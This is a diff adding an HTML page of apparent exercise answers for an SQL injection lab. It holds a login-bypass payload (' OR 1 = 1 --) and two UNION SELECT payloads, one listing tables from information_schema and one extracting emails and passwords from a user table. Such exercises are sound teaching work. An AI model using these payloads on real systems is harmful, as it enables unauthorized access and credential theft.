@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<title>SQL Injection</title>
+</head>
+<body>
+  {% markdown %}
+    ## Q1
+
+    ```
+    email = test@user.com
+    password = ' OR 1 = 1 -- 
+    ```
+
+    ## Q2
+
+    1. find tables
+    ```
+    name = ' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME  FROM information_schema.columns -- 
+    ```
+
+    2. get email/password
+    ```
+    name = ' UNION SELECT id, email, password FROM user -- 
+    ```
+
+  {% endmarkdown %}
+</body>
+</html>
